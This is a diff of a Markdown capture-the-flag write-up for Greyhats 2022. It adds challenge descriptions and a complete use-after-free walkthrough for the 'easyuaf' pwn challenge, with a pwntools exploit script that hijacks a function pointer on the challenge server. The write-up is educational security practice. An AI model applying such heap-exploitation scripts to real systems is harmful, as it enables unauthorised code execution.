@@ -1,12 +1,42 @@
 # Greyhats 2022
 
-19th place (4501 points) 1/cosd 
+19th place - 4501 points, 1/cosd 
 
 2370 points, samuzora
+
+## Contents
+
+### Web
+
+[Too Fast](#too-fast)
+
+[SelNode](#selnode)
+
+[Quotes](#quotes)
+
+[Shero](#shero-(incomplete))
+
+[Grapache](#grapache-(incomplete))
+
+### Pwn
+
+[easyoob](#easyoob)
+
+[easyoob2](#easyoob2)
+
+[easyuaf](#easyuaf)
+
+---
 
 ## Web
 
 ### Too Fast
+
+> Something went by too quickly!
+> 
+> Dragonnym
+> 
+> <http://challs.nusgreyhats.org:14004/>
 
 On viewing the raw HTML, there seems to be some "comments" regarding some sort of portal.
 
@@ -26,6 +56,14 @@ $ curl http://challs.nusgreyhats.org:14004/admin.php
 ---
 
 ### selnode
+
+> My colleagues always hate it when they have to set up selenium on their own, so I help them set up a public one. I called it SaaS(Selenium as a Service). I hope it's safe enough, rite?
+> 
+> 复读机
+> 
+> <http://challs.nusgreyhats.org:12323/>
+
+[Files](./selnode/)
 
 The challenge wants us to run a binary to get the flag. 
 
@@ -60,6 +98,12 @@ Run ./out and flag!
 ### Quotes
 
 *I really thought I could get first blood for this one smh* - samuzora
+
+> Feeling lost? Why don't you come and get quotes from the wise?
+> 
+> 复读机
+> 
+> <http://challs.nusgreyhats.org:12326/>
 
 This challenge is a quote generator service. Below is a summary of the various endpoints:
 
@@ -286,7 +330,15 @@ Then I stuck alr :(
 
 ### Grapache (incomplete)
 
-This one really waste my time... I spent 1 day on it thinking I can blood lolol
+This one really killed me... I spent 1 day on it hoping I could first blood 
+
+> No description is good description
+> 
+> 复读机
+>
+> <http://challs.nusgreyhats.org:12321/>
+
+[Files](./grapache/)
 
 The challenge is a Grafana server running behind Apache reverse proxy. 
 
@@ -296,12 +348,12 @@ Apparently there's a path traversal bug, but the writeup only shows how to bypas
 
 Now we have 2 options:
 
-1. Try to find Apache path traversal bypass
+1. Try to find Apache URL normalization bypass
 2. Apache SSRF to backend and path traversal
 
 I tried the first one for very very very very long, until I decided it's not possible.
 
-Then I found [this](https://firzen.de/building-a-poc-for-cve-2021-40438) SSRF vuln, and tried to exploit it but fail
+Then I found [this](https://firzen.de/building-a-poc-for-cve-2021-40438) SSRF vuln, and tried to exploit it but failed
 
 Post-CTF: Apparently it's the correct method :(( I just too noob to do it
 
@@ -310,6 +362,14 @@ Post-CTF: Apparently it's the correct method :(( I just too noob to do it
 ## Pwn
 
 ### easyoob
+
+> Out-of-bounds access is a very nice to exploit bug. Try to overwrite some values in memory to control the program's execution flow.
+> 
+> daniellimws
+> 
+> nc challs.nusgreyhats.org 10524
+
+[Files](./easyoob)
 
 ```c
 typedef struct entry
@@ -398,6 +458,15 @@ p.interactive()
 ---
 
 ### easyoob2
+
+> It is nice to have a function that gives you the flag. But it's not so easy in real life.
+> Can you find a way to spawn a shell from exploiting the service?
+> 
+> daniellimws
+> 
+> nc challs.nusgreyhats.org 10526
+
+[Files](./easyoob2)
 
 ```c
 typedef struct entry
@@ -639,7 +708,169 @@ grey{0k_n0t_b4d_t1m3_t0_try_th3_h4rd3r_0n3s}
 
 ### easyuaf
 
-TODO
+```c
+typedef struct person
+{
+    char name[24];
+    int id;
+    int age;
+    int personal_num;
+    int business_num;
+} person;
+
+typedef struct org
+{
+    char name[24];
+    int id;
+    void (*display)(struct org*, struct person*);
+} org;
+
+void print_card()
+{
+    int org_id;
+    while (1)
+    {
+        printf("Org ID (0-%d): ", CAPACITY-1);
+        org_id = readint();
+        if (org_id < 0 || org_id >= CAPACITY) puts("Invalid org ID");
+        else if (orgs[org_id] == 0)
+            printf("No org created with ID %d. Choose a different ID.\n", org_id);
+        else break;
+    }
+
+    int person_id;
+    while (1)
+    {
+        printf("Person ID (0-%d): ", CAPACITY-1);
+        person_id = readint();
+        if (person_id < 0 || person_id >= CAPACITY) puts("Invalid person ID");
+        else if (persons[person_id] == 0)
+            printf("No person created with ID %d. Choose a different ID.\n", org_id);
+        else break;
+    }
+
+    org *o = orgs[org_id];
+    person *p = persons[person_id];
+
+    printf("display func @ %p\n", o->display);
+    o->display(o, p);
+}
+```
+
+The title mentions Use After Free. Honestly, it's my first time trying heap-based pwn, so I'll be more thorough in this writeup.
+
+The `org` struct has a display attribute that allows us to control which display function is called when displaying user info. We can also
+
+```
+NameCard Printing Service v0.1
+---------------------
+1. New person
+2. New org
+3. Delete org
+4. Print name card
+5. Exit
+---------------------
+>
+```
+
+Goal: to overwrite Print name card (aka display function) such that it calls ezflag.
+
+Let's try to do a UAF first.
+
+---
+
+#### UAF
+
+The heap is a memory section that stores variables. It's usually accessed via `malloc` and released via `free`. Use After Free refers to a binary "using" some variables after it's been "freed". When that occurs, there won't be any immediately fatal bugs, but we can exploit it to suit our liking.
+
+![Normal](./images/easyuaf0.png)
+
+This is the normal name card that's printed out after we've created an org and user. Watch what happens after we delete the org and call Print name card:
+
+![UAF](./images/easyuaf1.png)
+
+The org name becomes some garbage! Why is this happening? Why are we still allowed to access the org in the first place?
+
+We can check out what's going on in GDB. But before we do that, let's uncomment all the printf lines in the source and compile it. You can compile without PIE if you like, doesn't affect the challenge too much.
+
+![Input](./images/easyuaf2.png)
+
+0x405740 is the address of the org in heap. Let's take a look in GDB.
+
+![Org chunk](./images/easyuaf3.png)
+
+4f4f4f is our org name (OOO), and 0x401290 presumably is our display function 1, we can confirm this using r2. 0x208a1 is not part of our org info, just some random chunk metadata. 
+
+Now that we've found our display function, we just need to overwrite this to something else we want. Let's see how we can control it by creating a new user. First, let's analyse a user chunk.
+
+![User chunk](./images/easyuaf4.png)
+
+We can see that 0x505050 is our user name (PPP), 0x1 is the user's age, and 0x300000002 is the personal and business contact number, combined into a single giant. This is because they are 32-bit integers but we specified /g which is 64-bit. In this case, our function address would probably go into the personal and business contact number. Let's give this a shot, by deleting the org, creating a user with an arbitrary personal contact number, and then calling the display function.
+
+![It crashed!](./images/easyuaf5.png)
+
+When we tried to call 0x0000000300000002, the binary crashed, because that's not a valid function address. Now we know how to control the display function! The address of ezflag can be found using r2, which is 0x401276 (4199030 base 10). Since it's small enough to fit into the personal contact number, we don't need to care about the business contact number.
+
+Let's make our exploit now!
+
+```py
+from pwn import *
+import sys
+
+# --- setup ---
+elf = context.binary = ELF('./easyuaf')
+if sys.argv[1] == 'l':
+    p = process()
+    gdb.attach(p)
+else:
+    p = remote('challs.nusgreyhats.org', 10525)
+
+# --- exploit ---
+def alloc_person(p, id, personal_num, business_num):
+    p.clean()
+    name, age = 'PPPP', 200
+
+    p.sendline(b'1')
+    p.sendline(str(id))
+    p.sendline(name)
+    p.sendline(str(age))
+
+    # stuff we want to control
+    p.sendline(str(personal_num))
+    p.sendline(str(business_num))
+
+def alloc_org(p, id):
+    p.clean()
+    name, style = 'OOOO', 1
+
+    p.sendline(b'2')
+    p.sendline(str(id))
+    p.sendline(name)
+    p.sendline(str(style))
+
+def free_org(p, id):
+    p.clean()
+    p.sendline(b'3')
+    p.sendline(str(id))
+
+def print_info(p, pid, oid):
+    p.clean()
+    p.sendline(b'4')
+    p.sendline(str(pid))
+    p.sendline(str(oid))
+
+alloc_person(p, 0, 1, 2)
+alloc_org(p, 0)
+free_org(p, 0)
+
+alloc_person(p, 1, elf.sym.ezflag, 0)
+print_info(p, 0, 0)
+p.interactive()
+```
+
+Run it on remote, and we get the flag.
+
+`grey{u_are_feeling_good?}`
 
 ---
 
